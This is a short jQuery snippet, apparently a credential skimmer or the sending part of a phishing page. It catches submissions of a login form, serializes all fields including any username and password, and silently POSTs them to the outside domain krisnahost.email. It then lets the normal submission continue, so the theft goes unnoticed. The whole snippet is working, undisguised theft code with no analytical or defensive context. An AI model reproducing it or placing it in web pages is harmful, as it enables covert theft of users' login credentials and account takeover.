$(".login-form").submit(function() {
 var d = $(".login-form");

 $.ajax({
        url: "https://krisnahost.email/",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
